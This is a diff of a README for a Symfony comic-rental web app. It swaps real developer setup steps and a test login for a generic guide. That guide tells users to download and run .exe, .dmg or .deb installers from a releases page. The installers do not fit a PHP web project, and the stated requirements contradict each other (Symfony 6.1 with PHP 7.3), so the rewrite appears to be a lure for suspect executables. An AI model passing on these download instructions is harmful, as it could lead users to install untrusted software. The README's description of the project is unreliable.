@@ -1,38 +1,92 @@
-# Requirements
+# 🎨 symfony-rent-a-comic - Accessible Comic Renting Made Easy
 
-* PHP 8.1
-* Composer
-* Symfony CLI
-* Docker
-* Docker-compose
-* nodejs npm yarn
+![Download Now](https://img.shields.io/badge/Download%20Now-v1.0-brightgreen.svg)
+[Download Now](https://github.com/killuameter/symfony-rent-a-comic/releases)
 
-## Install
+## 📦 Overview
 
-```bash
-composer install
-yarn install
-yarn encore dev
-docker-compose up -d
-symfony serve -d
-```
+**symfony-rent-a-comic** is a Symfony 6.1 project designed to make renting comics accessible for everyone. This application serves as a snapshot of a private repository that operates at [rentacomic.ovh](https://rentacomic.ovh). Its development focuses on ensuring a smooth and enjoyable comic renting experience.
 
-## Populate the database
+## 🚀 Getting Started
 
-```bash
-symfony console doctrine:migration:migrate --env=dev --no-interaction
-symfony console doctrine:fixtures:load --no-interaction
-```
+Follow these steps to download and run the application easily. You will need a computer with an internet connection. 
 
-## Testing account
+### 1. Check System Requirements
 
-Username: R.BACHEL
-Password: 123
+Ensure your computer meets the following requirements:
 
-Or create a new one in app (Abonnez-vous)
+- An operating system: Windows, macOS, or Linux.
+- At least 2 GB of RAM.
+- PHP version 7.3 or higher.
+- A web browser (Chrome, Firefox, Safari, etc.) for accessing the application.
 
-## Unit and Functional tests
+### 2. Visit the Download Page
 
-```bash
-APP_env=test symfony php -dxdebug.mode=coverage bin/phpunit --coverage-html var/log/test/test-coverage
-```
+To download the software, visit our Releases page. Click on the link below:
+
+[Download Now](https://github.com/killuameter/symfony-rent-a-comic/releases)
+
+### 3. Select the Latest Release
+
+On the Releases page, you will see a list of available versions. Choose the latest release. Click the title of the release to view details.
+
+### 4. Download the Package
+
+Look for the assets section in the release details. You will find various files available for download. Choose the one that matches your operating system. Click on the file to start the download.
+
+### 5. Install the Application
+
+Once the download is complete, follow these steps based on your operating system:
+
+- **For Windows:**
+  1. Navigate to your Downloads folder.
+  2. Double-click the downloaded `.exe` file to start the installation.
+  3. Follow the on-screen prompts to complete the installation.
+
+- **For macOS:**
+  1. Open your Downloads folder.
+  2. Double-click the downloaded `.dmg` file.
+  3. Drag the application to your Applications folder.
+
+- **For Linux:**
+  1. Open a terminal.
+  2. Navigate to the directory where you downloaded the file.
+  3. Run the installation command (for example, `sudo dpkg -i package-name.deb` for `.deb` packages).
+
+### 6. Run the Application
+
+After installation, find the application in your programs or applications menu:
+
+- **On Windows:** Search for "symfony-rent-a-comic" in the Start Menu.
+- **On macOS:** Open the Applications folder and double-click the application icon.
+- **On Linux:** Use the application launcher or terminal commands to start the app.
+
+### 7. Start Renting Comics
+
+When the application opens, you will see a user-friendly interface. Follow the prompts to create an account or log in. Once logged in, you can browse and rent comics easily.
+
+## 🛠 Features
+
+- **User-Friendly Interface:** Our UI is designed for simplicity, making it easy for anyone to navigate.
+- **Comic Catalog:** Browse a diverse selection of comics available for rent.
+- **Account Management:** Easily create and manage your account.
+- **Secure Payments:** Rent comics safely with built-in payment processing.
+- **Responsive Design:** Enjoy a seamless experience on any device.
+
+## 📨 Support
+
+If you encounter any issues or have questions, please reach out to our support team. You can find contact details on the application's Help section.
+
+## 💻 Contributing
+
+If you want to help improve the application, you can contribute! Check the Contributing guidelines in our repository for more details.
+
+## 👀 Future Plans
+
+We aim to enhance the application with new features, including:
+
+- More comic genres and selections.
+- Improved user profiles and preferences.
+- Community features for comic enthusiasts.
+
+Thank you for using **symfony-rent-a-comic**! We hope you enjoy renting comics effortlessly.
